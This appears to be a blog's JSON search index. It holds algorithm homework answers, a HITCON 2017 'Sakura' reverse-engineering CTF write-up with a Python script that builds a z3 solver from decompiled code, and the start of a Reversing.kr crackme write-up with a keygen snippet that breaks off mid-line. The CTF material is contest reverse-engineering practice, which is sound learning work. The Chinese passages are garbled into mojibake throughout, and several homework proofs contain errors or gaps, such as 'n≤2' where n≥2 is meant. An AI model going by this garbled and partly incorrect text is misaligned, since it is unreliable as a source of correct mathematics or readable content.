consecutive indices of rows and columns. problem 11 Given a sequence of integers, and k another integer, design an algorithm to find a substring such that the sum of the numbers in it is exactly k if there does exist such a substring.","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework1","slug":"Advance-Algorithm-homework1","date":"2017-11-12T19:56:41.000Z","updated":"2024-06-20T16:45:59.592Z","comments":true,"path":"en/Advance-Algorithm-homework1/","permalink":"http://blog.terrynini.tw/en/Advance-Algorithm-homework1/","excerpt":"æ•´ç†ä¸€ä¸‹ä½•éŒ¦æ–‡æ•™æˆé«˜ç­‰æ¼”ç®—æ³•èª²ä¸Šçš„ä½œæ¥­ã€‚ä½œæ¥­é¡Œç›®å¥½åƒéƒ½ä¸å¤ªæœƒè®Šçš„æ¨£å­ï¼Ÿæ‰€ä»¥å¦‚æœä½ æœ‰åƒè€ƒæˆ‘æ•´ç†çš„é¡Œç›®çš„è©±ï¼Œç•™å€‹è¨€è®“æˆ‘çŸ¥é“æˆ‘åšåŠŸå¾·äº†â™¥æœ‰ä»€éº¼å•é¡Œéƒ½å¯ä»¥åœ¨ä¸‹é¢ç•™è¨€è¨è«–ï¼Œç§è¨Šæˆ‘ä¹Ÿå¯ä»¥ã€‚ Written in English.","text":"æ•´ç†ä¸€ä¸‹ä½•éŒ¦æ–‡æ•™æˆé«˜ç­‰æ¼”ç®—æ³•èª²ä¸Šçš„ä½œæ¥­ã€‚ä½œæ¥­é¡Œç›®å¥½åƒéƒ½ä¸å¤ªæœƒè®Šçš„æ¨£å­ï¼Ÿæ‰€ä»¥å¦‚æœä½ æœ‰åƒè€ƒæˆ‘æ•´ç†çš„é¡Œç›®çš„è©±ï¼Œç•™å€‹è¨€è®“æˆ‘çŸ¥é“æˆ‘åšåŠŸå¾·äº†â™¥æœ‰ä»€éº¼å•é¡Œéƒ½å¯ä»¥åœ¨ä¸‹é¢ç•™è¨€è¨è«–ï¼Œç§è¨Šæˆ‘ä¹Ÿå¯ä»¥ã€‚ Written in English. problem 1 Recall the recursive program (discussed in the class) that computes the n-th Fibonacci number. Compute the number of additions used by the program. $$ T(1) = 0$$ $$ T(n) = T(n-1) + T(n-2) + 1 $$ $$ T(n) < 2T(n-1) + 1 = 4T(n-2) + 2 + 1 = 8T(n-3) + 4 + 2 + 1 $$ $$ T(n) < 2^kT(n-k) + \\frac{(1-2^k)}{1-2} $$ $$ if\\;n-k=1,k=n-1$$ $$ O(T(n)) = O( 2^{n-1}T(1) + \\frac{1-2^{n-1}}{1-2} ) = O(2^n) $$ problem 2 Determine the space complexity of the quicksort algorithm. For in-place quick sort, space complexity is determined by stacks used by recursive call. The best case, it needs O(logn) recursive call to sort, the space complexity is O(logn). The worse case, it needs O(n) recursive call to sort, the space complexity is O(n). We know the the average case of quick sort is that it need O(logn) recursive call, so the space complexity of quicksort is O(logn). problem 3 Derive an exact closed formula of the merge sort recurrence relation $T(n): T(n) &#x3D; T(\\lfloor \\frac{n}{2} \\rfloor) + T(\\lceil \\frac{n}{2} \\rceil) + n-1, T(1) &#x3D; 0$ $$ T(n) = 2T(\\frac{n}{2}) + n-1 = 4T(\\frac{n}{4}) + n-2 + n-1 = 8T(\\frac{n}{8}) + n-4 + n-2 + n-1 $$ $$ T(n) = 2^kT(\\frac{n}{2^k}) + kn + \\frac{1-2^k}{1-2} $$ $$ if \\frac{n}{2^k} = 1 , k = log_2(n) $$ $$ T(n) = nlog_2(n) + \\frac{1-n}{1-2}$$ problem 4 Given a set of n+1 numbers out of the first 2n natural numbers 1, 2, â€¦, 2n, prove by mathematic induction that here are two numbers in the set, one of which divides the other. Basis : $n &#x3D; 1, 1|2 $Assume that, for $n &#x3D; k$, it holds(select k+1 numbers from first 2k natural numbers). When $ n &#x3D; k + 1 $(select k+2 numbers from first 2k+2 natural numbers), there are three situation: Each number we select is less or equal to 2k, means that we select k+2 numbers from first 2k natural numbers. Under this situation, it holds. One number we select is greater than 2k, means that we select remaining k+1 numbers from first 2k natural numbers. Under this situation, it holds. We select both 2k+1 and 2k+2 : If we select k+1, then $(k+1)|(2k+2)$. It holds. If not, then itâ€™s similar to the situation 2 ,which we select k+1 numbers from first 2k natural numbers.It means there exists $x|y$ in k+1 numbers we selected , if $ x \\ne k+1, y \\ne k+1 $,that means we can find $x|y$ in situation 3 without term k+1, but what if x or y equal to k+1 ? if $x|y,y&#x3D;k+1$,it mean $x$ is ALSO a factor of 2k+2. It still holds.$$ QED $$ problem 5 For an undirected graph $G&#x3D;(V, E)$ and a vertex $v$ in $V$, let $G\\backslash v$ denote the subgraph of $G$ obtained by removing $v$ and all the edges incident to $v$ from $G$. If $G$ is connected, prove that we can always find a vertex $v$ in $G$ such that $G\\backslash v$ is connected. We know that if a graph is connected, there is a spanning tree. Removing the leaf node of spanning tree still makes graph connected. problem 6 Given $n \\geq 1$ numbers x1, x2, â€¦, xn, show that the function $f(x) &#x3D; \\sum_{1\\le i\\le n}|x-x_i|$ takes its minimum value at the median of these n number. Extend this result to the following problem: Given n pairs of numbers (a1, b1), â€¦, (an, bn) with each $ ai \\ne 0 $ , determine the position at which the function $ f(x) &#x3D; \\sum_{1\\le i\\le n}|a_ix-b_i| $ takes its minimum value. $$let;M;&#x3D;;median;of;x_i$$$$ x_1 \\le x_2 \\le â€¦ \\le x_s \\le A \\le x_{s+1} \\le â€¦ \\le x_t \\le M \\le x_{t+1} \\le â€¦ \\le x_n $$ If n is even and an arbitrary number A is less or equal than M:$$ n &#x3D; 2t $$$$ f(A) &#x3D; {\\sum_{i&#x3D;1}^s(A-x_i) + \\sum_{i&#x3D;s+1}^n(x_i-A)}$$$$ &#x3D; \\sum_{i&#x3D;1}^t(A-M+M-x_i) - \\sum_{i&#x3D;s+1}^t(A-x_i)+\\sum_{i&#x3D;t+1}^n(x_i-M+M-A) +\\sum_{i&#x3D;s+1}^t(x_i-A)$$$$ &#x3D; \\sum_{i&#x3D;1}^t(M-x_i)+ t(A-M) + \\sum_{i&#x3D;t+1}^n(x_i-M)+(n-t)(M-A) + 2\\sum_{i&#x3D;s+1}^t(x_i-A)$$$$ &#x3D; \\sum_{i&#x3D;1}^t(M-x_i) + \\sum_{i&#x3D;t+1}^n(x_i-M) + 2\\sum_{i&#x3D;s+1}^t(x_i-A) +(n-2t)(M-A) $$$$ when;A;&#x3D;;M,;2\\sum_{i&#x3D;s+1}^t(x_i-A);has;minimum;value$$(Proof this when A&gt;&#x3D;M,and when n is odd, itâ€™s easy) Extend this result to $ f(x) &#x3D; \\sum_{1\\le i\\le n}|a_ix-b_i| $ $Let;v_i&#x3D;|a_i|,w_i&#x3D;\\frac{b_i}{a_i}$$$f(x) &#x3D; \\sum_{1\\le i\\le n}|a_ix-b_i|$$$$&#x3D; \\sum_{1\\le i\\le n}|a_i||x-\\frac{b_i}{a_i}|$$$$&#x3D; \\sum_{1\\le i\\le n}v_i|x-w_i|$$$f(x) &#x3D; \\sum_{1\\le i\\le n}v_i|x-w_i|$ takes its minimum value at the median of the sequence :$$w_1,w_1,â€¦,w_1,â€¦,w_2,w_2,â€¦,w_2,â€¦,w_n,w_n,â€¦,w_n$$$$|â€”â€”â€”v_1â€”â€”â€“||â€”â€”â€”v_2â€”-|â€¦.|â€”â€“v_nâ€”â€”|$$ problem 7 Prove the Helly Property on Trees: Given a tree T and k subtrees of T such that each pair of subtrees has at least one vertex in common, show that there is at least one vertex incommon to all the subtrees. Definition of Helly Property : A family $ \\\\{A\\_i: i \\in I \\\\} $ of subsets of a set $A$ is said to satisfy the Helly property,if $J \\subseteq I$, and $A\\_i\\cap A\\_j\\ne \\emptyset$, for every $i, j \\in J$, then $\\cap\\_{j\\in J}A\\_j\\ne \\emptyset$. Briefly, a set $J$ of sets $A_i$ has the Helly property if for every subset $T$ of $J$ the following holds: if the elements of $T$ pairwise intersect, then the intersection of all elements of $T$ is also non-empty. Quoted from here problem 8 Let $d_1, d_2, â€¦, d_n,;n\\le 2$, be positive integers. Prove that if $d_1+ d_2+ â€¦+ d_n &#x3D; 2n - 2$, then there exists a tree with n vertices of degrees exactly $d_1, d_2, â€¦, d_n$. Based on your proof, design an efficient algorithm to construct such a tree. Basis :when $n&#x3D;1,d_1&#x3D;0$,it holds.when $n&#x3D;2,d_1&#x3D;1,d_2&#x3D;1$ , it holds. Induction :$$ Let;d_1\\le d_2\\le d_3\\le â€¦ \\le d_n $$$$ d_1&#x3D;1,otherwise, $$$$ d_1+ d_2+ â€¦+ d_n \\ge 2n \\ge 2n - 2 $$$$ when;n\\ne 2, d_n\\ge 2,otherwise,$$$$ d_1+ d_2+ â€¦+ d_n &#x3D; n &lt; 2n-2 $$ Therefor$$ d_1+ d_2+ â€¦+ d_n +d_{n+1} &#x3D; 2(n+1)-2 &#x3D; 2n $$$$ d_1+ d_2+ â€¦ + d_n +d_{n+1} - 2 &#x3D; 2n-2 $$$$ d_1+ d_2+ â€¦ + (d_n +d_{n+1} - 2) &#x3D; 2n-2 $$$ d_1+ d_2+ â€¦ + (d_n + d_{n+1} - 2) $ satisfy the induction hypothesis, so there exist a tree with n vertices with these degrees.Remove $(d_{n+1} - 1)$ neighbours from the vertix whose degree is $(d_n + d_{n+1} - 2)$, connect those neighbours with a new node,and connect the new node with the vertix whose original degree is $(d_n + d_{n+1} - 2)$.Then we get$$ d_1+ d_2+ â€¦ + d_n +d_{n+1} &#x3D; 2n $$$$QED$$ algorithm : Sort $d_1+ d_2+ â€¦+ d_n$ in ascending order. Create a node $P$ with smallest degree in sequence excluding 1. Iterating from 1 to n,and add nodes to $P$ until the degree of p become 1. Go back to 2 until there is no more nodes can be added problem 9 Let G&#x3D;(V, E) be a directed graph (not necessarily acyclic). Design an efficient algorithm to label the vertices of the graph with distinct labels from 1 to |V| such that the label of each vertex v is greater than the label of at least one of vâ€™s predecessors, or determine that no such labeling is possible. (A predecessor of v is a vertex w such that $wv \\in E$) You can find it in Morris's old blog. [Q8](http://mypaper.pchome.com.tw/zerojudge/post/1325745839) problem 10 Give a linear-time algorithm that takes as input a tree and determines whether it has a perfect matching: a set of edges that touches each node exactly once. perfect matching : [English](http://mathworld.wolfram.com/PerfectMatching.html), [Chinese](http://www.csie.ntnu.edu.tw/~u91029/Matching.html) Because leaf nodes must match with their parent, we can perform a devide and conquer algorithm. pseudo code#define UNMATCH 0#define MATCH 1#define FAIL -1int PerfectMatching ( n ) if child of n == 0 // if this node is leaf return UNMATCH // told it&#x27;s parent node that &quot;this child node is unmatch&quot; match_flag &lt;- UNMATCH //state of current node foreach child c of n //loop to check the state of every child node of current node state &lt;- PerfectMatching( c ) if state == UNMATCH //if child node is UNMATCH, if match_flag == UNMATCH //and current node is UNMATCH, too match_flag = MATCH // match them. else // But if the state of current node is MATCH, return FAIL //means this tree won&#x27;t be perfect matching else if state == FAIL return FAIL return match_flag problem 11 Consider a variation of the towers of Hanoi. We no longer assume that all the disks are initially on one peg. They may be arbitrarily distributed among the three pegs, as long as they are ordered in decreasing sizes on each peg. The purpose remains to move all disks to one specified peg, under the same constraints as the original problem, with as few moves as possible. Design an algorithm to find a minimal sequence of moves. How about the reverse of the problem? The solution is similar to original Hanoi problem Recursive Solution:1. Find the biggest disk2. If the disk is moveable to goal peg then move and go to 4, otherwise, go to 3.3. Set-up (Nâˆ’1)-disk tower on non-goal peg.4. Back to 1 problem 12 Let T be an undirected tree. The distance between two vertices in T is the length of the path connecting these two vertices (neighbours have distance 1). The diameter of T is the maximal distance over all pairs of vertices. Design an algorithm to find the diameter of the given tree. Because the highest two subtree of T determind the diameter of T. The algorithm look like this: Picking an arbitrary node, then find the farthest node $P_f$ from it. Next, find the farthest node $P_g$ from $P_f$. The distance between $P_g$ and $P_f$ is the diameter of T. Itâ€™s easy to proof. problem 13 Consider the iterative method for solving the towers of Hanoi problem described in Unit 2. Prove the correctness of the algorithm. iterative methodwhile (1) &#123; move the smallest disk from its current peg to the next peg in clockwise order; if( all disks are correctly piled on someother peg ) break; make the only move possible that does notinvolve the smallest disk;&#125; We have three peg, $P\\_0\\;P\\_1\\;P\\_2$ ,and $K$ disks,$D\\_1,D\\_2,D\\_3,...,D\\_K$ ,$K \\in N$. Assume that all disks are at peg $P\\_0$ initially. $K$ is odd : Disks will be moved to the peg $P\\_{(0+1)mod3}$ $K$ is even : Disks will be moved to the peg $P\\_{(0+2)mod3}$ Basis :$K&#x3D;1$:Move $D_1$ from $P_0$ to $P_1$it holds. $K&#x3D;2$:Move $D_1$ from $P_0$ to $P_1$Move $D_2$ from $P_0$ to $P_2$Move $D_1$ from $P_1$ to $P_2$It holds Induction :Assume that it holds when $K&#x3D;n$ and n is odd.($D_1,â€¦,D_K $ would be moved from $P_0$ to $P_1$) $When;K&#x3D;n+1$:||Step1. Move top n disk from $P_0$ to $P_1$ (Induction hypothesis)||Step2. Last move of previous step is moving smallest disk from $P_0$ to $P_1$, |so the next move is moving $D_{n+1} from $P_0$ to $P_2$||Step3. Move n disk from $P_1$ to $P_2$ (Induction hypothesis)||All disks are being moved from $P_0$ to $P_2$, it holds| Assume that it holds when $K&#x3D;n$ and n is even.($D_1,â€¦,D_K $ would be moved from $P_0$ to $P_2$) $When;K&#x3D;n+1$:||Step1. Move top n disk from $P_0$ to $P_2$ (Induction hypothesis)||Step2. Last move of previous step is moving smallest disk from $P_0$ to $P_2$, |so the next move is moving $D_{n+1} from $P_0$ to $P_1$||Step3. Move n disk from $P_2$ to $P_1$ (Induction hypothesis)||All disks are being moved from $P_0$ to $P_1$, it holds|$$QED$$","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"2017::HITCON-Quals::Sakura::English","slug":"2017-HITCON-Quals-Sakura-English","date":"2017-11-07T07:39:57.000Z","updated":"2018-05-04T15:55:16.000Z","comments":true,"path":"en/2017-HITCON-Quals-Sakura-English/","permalink":"http://blog.terrynini.tw/en/2017-HITCON-Quals-Sakura-English/","excerpt":"Ask to input 400 chars, then take it as a 20*20 arryNext the binary run a function to verify the arrayIf the verification were success, it would give you the SHA256 hash of you input, which is flag Letâ€™s take a look at the function I mentionedThere are 150 while loops in this functionBefore loops, it initialize lots of variablesThose loops are all similar to each:","text":"Ask to input 400 chars, then take it as a 20*20 arryNext the binary run a function to verify the arrayIf the verification were success, it would give you the SHA256 hash of you input, which is flag Letâ€™s take a look at the function I mentionedThere are 150 while loops in this functionBefore loops, it initialize lots of variablesThose loops are all similar to each: V1 &lt;- fetch a local variablecounter &lt;- call addition function to determine how many time to loopWhile fetch a char from UserInput according to V1 the int(char) can only be 1~9, or fail the int(char) can not repeat in this while loop, or fail add the int(char) to local variable (sum) of this loopENDsum should equal to a certain value, or fail !!Notice that if verification was failed, the binary would not stop immediately, it only set the flag to false Itâ€™s not so hard to find out that you can do some symbolic execution to get the right inputBut there are so many loops and so many variablesThis is a ppc problem (ã£ãƒ»Ğ”ãƒ»)ã£ Because I donâ€™t know how to quickly get the address that I want to put into the avoid of angrâ€™s explorer, I decided to use z3 solver. For convenient, letâ€™s name some weird function.Most of them just return the argument directly, so I named them nothingSome function would return the argument adding by a number, so I named them plus_(number)OK, I dumped psudocode to sakura_de.c and seperate the syntax of initializing local variables to a text file, variable Now, all I need to do is to write a script to generate a z3 script solver.py #! /usr/bin/env python# -*- coding: utf-8 -*-import ref = open(&quot;./sakura_de.c&quot;, &quot;r&quot;).read()#get the variable and constraint of every loopidx = re.findall(&quot;v[0-9]* = \\(__int64 \\*\\)nothing_[0-9]*\\(\\(__int64\\)\\&amp;v([0-9]*)\\)&quot;, f)loop_n = re.findall(&quot;v[0-9]* = plus_([0-9]*)&quot;, f)con = re.findall(&quot;\\( v[0-9]* \\!= ([0-9]*) \\)&quot;, f)f = open(&quot;./variables&quot;, &quot;r&quot;).read()#get the local variable on stackequ = re.findall(&quot;v([0-9]*) = ([0-9]*);&quot;, f) stack = [0]*1944for ( x , y ) in equ: stack[int(x)] = int(y)get_stack = lambda a,b: (stack[int(idx[a])+b*2] + (stack[int(idx[a])+1+b*2] &lt;&lt;32))z3_code = &quot;&quot;&quot;#! /usr/bin/env python# -*- coding: utf-8 -*-from z3 import *s = Solver()&quot;&quot;&quot;#add constraint to z3for row in range(20): for col in range(20): name = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;&#123;&#125; = Int(&#x27;&#123;&#125;&#x27;)\\n&quot;.format(name,name) z3_code += &quot;s.add( 0 &lt; &#123;&#125; , &#123;&#125; &lt; 10)\\n&quot;.format(name,name)for j in range(150): loop = int(int(loop_n[j])/8) this_loop = [] for i in range(loop): xx = get_stack(j,i) row = xx&amp;0xffffffff col = xx&gt;&gt;32 this_loop.append((row, col)) for i in range(0,len(this_loop)-1): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) for k in range(i+1,len(this_loop)): (row, col) = this_loop[k] b = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;s.add( &#123;&#125; != &#123;&#125;)\\n&quot;.format(a, b) z3_code += &quot;s.add(&quot; for i in range(len(this_loop)): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot; &#123;&#125; + &quot;.format(a) z3_code += &quot; 0 == &#123;&#125;)\\n&quot;.format(con[j])z3_code += &quot;&quot;&quot;s.check()m = s.model()sakura = [0]*400for i in m: row = ord(str(i)[0]) - ord(&#x27;A&#x27;) col = int(str(i)[1:]) sakura[ 20*row + col ] = str(m[i])print &#x27;&#x27;.join(sakura)&quot;&quot;&quot;exec z3_code sakura_de.c (partial) __int64 __fastcall sub_850(__int64 UserInput)&#123; v604 = (__int64 *)nothing_16((__int64)&amp;v904); v754 = plus_16((__int64)&amp;v904); while ( v604 != (__int64 *)v754 ) &#123; v1 = *v604; *(&amp;OutPutArray[20 * (signed int)v1] + SHIDWORD(v1)) = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)); v454 = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)) - &#x27;0&#x27;; if ( v454 &lt;= 0 || v454 &gt; 9 ) Success = 0; if ( (v304 &gt;&gt; v454) &amp; 1 ) Success = 0; v304 |= 1 &lt;&lt; v454; v154 += v454; ++v604; &#125; if ( v154 != 17 ) Success = 0; v155 = 0; v305 = 0; v605 = (__int64 *)nothing_16((__int64)&amp;v908); v755 = plus_16((__int64)&amp;v908); while ( v605 != (__int64 *)v755 ) &#123; v2 = *v605; *(&amp;OutPutArray[20 * (signed int)v2] + SHIDWORD(v2)) = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)); v455 = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)) - 48; if ( v455 &lt;= 0 || v455 &gt; 9 ) Success = 0; if ( (v305 &gt;&gt; v455) &amp; 1 ) Success = 0; v305 |= 1 &lt;&lt; v455; v155 += v455; ++v605; &#125; if ( v155 != 3 ) Success = 0; variables (partial) v904 = 1;v905 = 6;v906 = 2;v907 = 6;v908 = 1;v909 = 7;v910 = 2;v911 = 7;v912 = 2;v913 = 1;v914 = 3;v915 = 1;v1312 = 2;v1313 = 2;v1314 = 3;v1315 = 2;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"HITCON","slug":"HITCON","permalink":"http://blog.terrynini.tw/tags/HITCON/"}]},{"title":"2017::HITCON-qual::Sakura","slug":"2017-HITCON-qual-Sakura","date":"2017-11-07T07:39:57.000Z","updated":"2017-12-18T00:56:19.000Z","comments":true,"path":"tw/2017-HITCON-qual-Sakura/","permalink":"http://blog.terrynini.tw/tw/2017-HITCON-qual-Sakura/","excerpt":"è¦æ±‚è¼¸å…¥ 400 å€‹å­—å…ƒç„¶å¾ŒæœƒæŠŠè¼¸å…¥ç•¶ä½œ20*20çš„é™£åˆ—ä¸Ÿå…¥functionåšé©—è­‰æœ‰ 150 å€‹è¿´åœˆåœ¨é€²å…¥è¿´åœˆæœƒæŠŠéœ€è¦çš„ local è®Šæ•¸è¨­å¥½æµç¨‹å¦‚ä¸‹","text":"è¦æ±‚è¼¸å…¥ 400 å€‹å­—å…ƒç„¶å¾ŒæœƒæŠŠè¼¸å…¥ç•¶ä½œ20*20çš„é™£åˆ—ä¸Ÿå…¥functionåšé©—è­‰æœ‰ 150 å€‹è¿´åœˆåœ¨é€²å…¥è¿´åœˆæœƒæŠŠéœ€è¦çš„ local è®Šæ•¸è¨­å¥½æµç¨‹å¦‚ä¸‹ å–ä¸€å€‹æœ¬åœ°è®Šæ•¸å‡ºä¾†æ¯å€‹è¿´åœˆåšçš„æ¬¡æ•¸ä¸ç­‰è¿´åœˆ æ ¹æ“šå‰›å‰›å–å‡ºçš„æ•¸ç‚ºæº–å¾ä½¿ç”¨è€…è¼¸å…¥ä¸­æ‹¿å­—å…ƒå‡ºä¾† æª¢æŸ¥ç¯„åœæ˜¯å¦åœ¨1~9 ä¸èƒ½æœ‰é‡è¤‡çš„æ•¸å­— éƒ½æ²’å•é¡Œå°±æŠŠå®ƒç´¯åŠ é€²æœ¬å›åœˆçš„sumä¸¦ä¸”æ”¾å…¥sha256è¦ç”¨çš„é™£åˆ—ä¸­ å†å–ä¸€æ¬¡æœ¬åœ°è®Šæ•¸å‡ºä¾†è¿´åœˆçµæŸæª¢æŸ¥sumæ˜¯å¦ç¬¦åˆæœ¬è¿´åœˆè¦æ±‚çš„æ•¸å€¼é€šé150å€‹è¿´åœˆçš„è©±å‰‡æœƒå°å‡ºflag æˆ‘çœ‹æœ‰äººç”¨angrè§£ï¼Œä½†æ˜¯æˆ‘è¦ºå¾—å¡ä½ç½®çµ¦ angr avoid æœ‰é»éº»ç…©ä¸å¦‚æŠŠ psudocode dump å‡ºä¾†ç”¨æ­£è¦è¡¨é”å–è®Šæ•¸ç›´æ¥ç”Ÿä¸€æ®µ z3 code è§£é™åˆ¶å¼ æ–¹ä¾¿ç­‰ç­‰ parse å…ˆæŠŠä¸€äº›å¥‡æ€ªçš„ function name ä¿®æ”¹ä¸€ä¸‹å¤§å¤šæ•¸åªæ˜¯å–®ç´”å›å‚³ï¼Œæˆ‘å‘½åç‚º nothingæœ‰åšåŠ æ³•å†å›å‚³çš„å‘½åç‚º plus_æ•¸å­—æŠŠ psudocode æ”¾é€² sakura_de.c ç„¶å¾Œå‰é¢ local variable çš„æŒ‡å®šå¼é•·å¾—å¤ªå¤§çœ¾è‡‰äº†ï¼Œæˆ‘æŠŠå®ƒç§»åˆ° variable æ–‡å­—æª” solver.py #! /usr/bin/env python# -*- coding: utf-8 -*-import ref = open(&quot;./sakura_de.c&quot;, &quot;r&quot;).read()#get the variable and constraint of every loopidx = re.findall(&quot;v[0-9]* = \\(__int64 \\*\\)nothing_[0-9]*\\(\\(__int64\\)\\&amp;v([0-9]*)\\)&quot;, f)loop_n = re.findall(&quot;v[0-9]* = plus_([0-9]*)&quot;, f)con = re.findall(&quot;\\( v[0-9]* \\!= ([0-9]*) \\)&quot;, f)f = open(&quot;./variables&quot;, &quot;r&quot;).read()#get the local variable on stackequ = re.findall(&quot;v([0-9]*) = ([0-9]*);&quot;, f) stack = [0]*1944for ( x , y ) in equ: stack[int(x)] = int(y)get_stack = lambda a,b: (stack[int(idx[a])+b*2] + (stack[int(idx[a])+1+b*2] &lt;&lt;32))z3_code = &quot;&quot;&quot;#! /usr/bin/env python# -*- coding: utf-8 -*-from z3 import *s = Solver()&quot;&quot;&quot;#add constraint to z3for row in range(20): for col in range(20): name = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;&#123;&#125; = Int(&#x27;&#123;&#125;&#x27;)\\n&quot;.format(name,name) z3_code += &quot;s.add( 0 &lt; &#123;&#125; , &#123;&#125; &lt; 10)\\n&quot;.format(name,name)for j in range(150): loop = int(int(loop_n[j])/8) this_loop = [] for i in range(loop): xx = get_stack(j,i) row = xx&amp;0xffffffff col = xx&gt;&gt;32 this_loop.append((row, col)) for i in range(0,len(this_loop)-1): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) for k in range(i+1,len(this_loop)): (row, col) = this_loop[k] b = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot;s.add( &#123;&#125; != &#123;&#125;)\\n&quot;.format(a, b) z3_code += &quot;s.add(&quot; for i in range(len(this_loop)): (row, col) = this_loop[i] a = chr(ord(&#x27;A&#x27;)+row) + str(col) z3_code += &quot; &#123;&#125; + &quot;.format(a) z3_code += &quot; 0 == &#123;&#125;)\\n&quot;.format(con[j])z3_code += &quot;&quot;&quot;s.check()m = s.model()sakura = [0]*400for i in m: row = ord(str(i)[0]) - ord(&#x27;A&#x27;) col = int(str(i)[1:]) sakura[ 20*row + col ] = str(m[i])print &#x27;&#x27;.join(sakura)&quot;&quot;&quot;exec z3_code sakura_de.c (partial) __int64 __fastcall sub_850(__int64 UserInput)&#123; v604 = (__int64 *)nothing_16((__int64)&amp;v904); v754 = plus_16((__int64)&amp;v904); while ( v604 != (__int64 *)v754 ) &#123; v1 = *v604; *(&amp;OutPutArray[20 * (signed int)v1] + SHIDWORD(v1)) = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)); v454 = *(_BYTE *)(UserInput + 20LL * (signed int)v1 + SHIDWORD(v1)) - &#x27;0&#x27;; if ( v454 &lt;= 0 || v454 &gt; 9 ) Success = 0; if ( (v304 &gt;&gt; v454) &amp; 1 ) Success = 0; v304 |= 1 &lt;&lt; v454; v154 += v454; ++v604; &#125; if ( v154 != 17 ) Success = 0; v155 = 0; v305 = 0; v605 = (__int64 *)nothing_16((__int64)&amp;v908); v755 = plus_16((__int64)&amp;v908); while ( v605 != (__int64 *)v755 ) &#123; v2 = *v605; *(&amp;OutPutArray[20 * (signed int)v2] + SHIDWORD(v2)) = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)); v455 = *(_BYTE *)(UserInput + 20LL * (signed int)v2 + SHIDWORD(v2)) - 48; if ( v455 &lt;= 0 || v455 &gt; 9 ) Success = 0; if ( (v305 &gt;&gt; v455) &amp; 1 ) Success = 0; v305 |= 1 &lt;&lt; v455; v155 += v455; ++v605; &#125; if ( v155 != 3 ) Success = 0; variables (partial) v904 = 1;v905 = 6;v906 = 2;v907 = 6;v908 = 1;v909 = 7;v910 = 2;v911 = 7;v912 = 2;v913 = 1;v914 = 3;v915 = 1;v1312 = 2;v1313 = 2;v1314 = 3;v1315 = 2;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"HITCON","slug":"HITCON","permalink":"http://blog.terrynini.tw/tags/HITCON/"}]},{"title":"Reversing.kr #1","slug":"Reversing-kr-write-up-1","date":"2017-07-20T02:34:12.000Z","updated":"2017-11-07T09:01:00.000Z","comments":true,"path":"tw/Reversing-kr-write-up-1/","permalink":"http://blog.terrynini.tw/tw/Reversing-kr-write-up-1/","excerpt":"æœ¬ä¾†æƒ³æŠŠ9é¡Œæ“ ä¸€ç¯‡çš„ï¼Œä½†æƒ³æƒ³é‚„æ˜¯åˆ†ä¸€ä¸‹å¥½äº†ï¼Œç¸½ä¹‹Easyç³»åˆ—å®Œå…¨å°±æ˜¯ easy peasy lemon squeezyé€™ç¯‡å…±4é¡Œï¼Œé‚„æ²’è§£é¡Œå»ºè­°ä¸è¦å…ˆçœ‹ã€‚","text":"æœ¬ä¾†æƒ³æŠŠ9é¡Œæ“ ä¸€ç¯‡çš„ï¼Œä½†æƒ³æƒ³é‚„æ˜¯åˆ†ä¸€ä¸‹å¥½äº†ï¼Œç¸½ä¹‹Easyç³»åˆ—å®Œå…¨å°±æ˜¯ easy peasy lemon squeezyé€™ç¯‡å…±4é¡Œï¼Œé‚„æ²’è§£é¡Œå»ºè­°ä¸è¦å…ˆçœ‹ã€‚ Easy Cracké¦–å…ˆç™¼ç¾è¼¸å…¥å¯†ç¢¼éŒ¯èª¤æ™‚æœƒè·³å‡ºéŒ¯èª¤è¨Šæ¯ï¼š ä»¥ Incorrect Password ä½œç‚ºé—œéµå­—æœå°‹disassembleçš„ä½å€å¾€ä¸Šä¸€é»æœƒç™¼ç¾ä¸Šé¢æœ‰å­—ä¸²çš„åˆ¤æ–·é‚è¼¯ï¼š æ…¢æ…¢æ¯”å°å°±å¯ä»¥æŠŠflagæ‹¼å‡ºä¾†äº†ï¼š Easy Keygené¡Œç›®è¦æ±‚æˆ‘å€‘æ‰¾åˆ°åºè™Ÿç‚º 5B134977135E7D13 æ™‚ï¼Œåå­—æ‡‰è©²æœƒæ˜¯ä»€éº¼åˆ†æå¾Œç™¼ç¾ç¨‹å¼æœƒæŠŠ[0x10,0x20,0x30]ä½œç‚ºkeyä¸æ–·xorè¼¸å…¥çš„å­—ä¸²ç„¶å¾ŒæŠŠåŠ å¯†å¾Œçš„å­—ä¸²çš„asciiç”¨hexå°å‡ºä¾†å¯«å€‹è…³æœ¬åè§£å›å»å°±å¥½äº†: from binascii import *serial = bytearray(unhexlify(&quot;5B134977135E7D13&quot;))key = [0x10, 0x20, 